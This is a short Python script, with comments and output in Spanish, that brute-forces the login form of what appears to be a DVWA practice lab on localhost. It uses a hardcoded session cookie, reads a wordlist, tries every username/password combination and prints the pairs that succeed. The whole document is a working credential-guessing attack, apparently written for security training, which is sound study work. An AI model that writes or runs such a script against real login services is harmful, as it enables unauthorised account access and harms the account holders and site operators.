import requests
import time

start_time = time.time()

cookie = {"PHPSESSID": "47455dbd3c95b59af75ea6b55a8ac3cf", "security":"low"}

def leer_archivo(file):
    with open(file,mode='r',encoding='utf-8') as file_text:
        return file_text.read()
    
user= leer_archivo("diccionario.txt").split("\n")
password= leer_archivo("diccionario.txt").split("\n")

for i in user:
    for j in password:
        url = f"http://localhost:8081/vulnerabilities/brute/?username={i}&password={j}&Login=Login#"
        respuesta = requests.get(url, cookies=cookie)
        if not "Username and/or password incorrect." in respuesta.text:
            print(f"[+] {i}:{j} es un par de usuario y contraseña correcto")

end_time = time.time()
print(f"El tiempo de ejecución fue de {end_time-start_time:.2f} segundos.")      